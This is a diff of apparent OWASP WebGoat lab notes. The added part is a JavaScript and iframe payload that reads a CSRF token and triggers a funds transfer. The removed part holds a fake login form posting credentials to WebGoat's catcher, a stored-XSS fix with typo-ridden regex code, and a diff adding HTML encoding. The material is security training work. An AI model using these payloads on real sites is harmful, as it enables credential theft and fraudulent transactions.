@@ -1,59 +1,22 @@
-a <form action="http:localhost:8080/webgoat/catcher?PROPERTY=yes" method="post"> <input type="text" name="user"/> <input type="password" name="password"/> <input type="button" name="login"/> </form>
+<script language="javascript">
+var tokenval;
+function readFrame1(){
+    var frameDoc = document.getElementById("frame1").contentDocument;
+    var form = frameDoc.getElementsByTagName("Form")[0];
+    var t = form.CSRFToken.value;
+    tokenval = '&CSRFToken='+t;
 
+    loadFrame2();
+}
 
+function loadFrame2(){
+    var testFrame = document.getElementById("frame2");
+    testFrame.src = "http://localhost:8080/WebGoat/attack?Screen=60&menu=900&transferFunds=main"+tokenval;
+}
+</script>
+<iframe src="http://localhost:8080/WebGoat/attack?Screen=60&menu=900&transferFunds=main" onload="readFrame1();"
+id="frame1" frameborder="1" marginwidth="0"
+marginheight="0" width="800" scrolling=yes height="300"> </iframe>
+<iframe id="frame2" frameborder="1" marginwidth="0"
+marginheight="0" width="800" scrolling=yes height="300"> </iframe>
 
-fixing stored XSS
-string rehex = "[[\\s\\w-,]]*";
-Patter patter = Pattern.compile(regex);
-validate (firstName + lastName + address1 + address2,pattern);
-
-
-
-					// Note: Do NOT get the password field.
-					String first_name = HtmlEncoder.encode(answer_results.getString("first_name"));
-					String last_name = HtmlEncoder.encode(answer_results.getString("last_name"));
-					String ssn = HtmlEncoder.encode(answer_results.getString("ssn")); 
-					String title = HtmlEncoder.encode(answer_results.getString("title")); 
-					String phone = HtmlEncoder.encode(answer_results.getString("phone"));
-					String address1 = HtmlEncoder.encode(answer_results.getString("address1"));
-					String address2 = HtmlEncoder.encode(answer_results.getString("address2"));
-					String start_date = HtmlEncoder.encode(answer_results.getString("start_date"));
-					String ccn = HtmlEncoder.encode(answer_results.getString("ccn"));
-					String disciplined_date = HtmlEncoder.encode(answer_results.getString("disciplined_date"));
-			  		String disciplined_notes = HtmlEncoder.encode(answer_results.getString("disciplined_notes"));
-					String personal_description = HtmlEncoder.encode(answer_results.getString("personal_description"));
-
-					profile = new Employee(answer_results.getInt("userid"), first_name,last_name, ssn, title, phone, address1, address2, answer_results.getInt("manager"), start_date, answer_results.getInt("salary"), ccn, answer_results.getInt("ccn_limit"), disciplined_date, disciplined_notes,personal_description);
-
-
-
-
-lib/tomcat7/webapps/WebGoat/WEB-INF/classes/org/owasp/webgoat/lessons/CrossSiteScripting$ diff ViewProfile.java ViewProfile_original.java 
-15,16d14
-< import org.owasp.webgoat.util.HtmlEncoder;
-< 
-103,114c101,108
-< 					String first_name = HtmlEncoder.encode(answer_results.getString("first_name"));
-< 					String last_name = HtmlEncoder.encode(answer_results.getString("last_name"));
-< 					String ssn = HtmlEncoder.encode(answer_results.getString("ssn")); 
-< 					String title = HtmlEncoder.encode(answer_results.getString("title")); 
-< 					String phone = HtmlEncoder.encode(answer_results.getString("phone"));
-< 					String address1 = HtmlEncoder.encode(answer_results.getString("address1"));
-< 					String address2 = HtmlEncoder.encode(answer_results.getString("address2"));
-< 					String start_date = HtmlEncoder.encode(answer_results.getString("start_date"));
-< 					String ccn = HtmlEncoder.encode(answer_results.getString("ccn"));
-< 					String disciplined_date = HtmlEncoder.encode(answer_results.getString("disciplined_date"));
-< 			  		String disciplined_notes = HtmlEncoder.encode(answer_results.getString("disciplined_notes"));
-< 					String personal_description = HtmlEncoder.encode(answer_results.getString("personal_description"));
----
-> 					profile = new Employee(answer_results.getInt("userid"), answer_results.getString("first_name"),
-> 							answer_results.getString("last_name"), answer_results.getString("ssn"), answer_results
-> 									.getString("title"), answer_results.getString("phone"), answer_results
-> 									.getString("address1"), answer_results.getString("address2"), answer_results
-> 									.getInt("manager"), answer_results.getString("start_date"), answer_results
-> 									.getInt("salary"), answer_results.getString("ccn"), answer_results
-> 									.getInt("ccn_limit"), answer_results.getString("disciplined_date"), answer_results
-> 									.getString("disciplined_notes"), answer_results.getString("personal_description"));
-116d109
-< 					profile = new Employee(answer_results.getInt("userid"), first_name,last_name, ssn, title, phone, address1, address2, answer_results.getInt("manager"), start_date, answer_results.getInt("salary"), ccn, answer_results.getInt("ccn_limit"), disciplined_date, disciplined_notes,personal_description);
-osboxes@osboxes:/var/lib/tomcat7/webapps/WebGoat/WEB-INF/classes/org/owasp/we
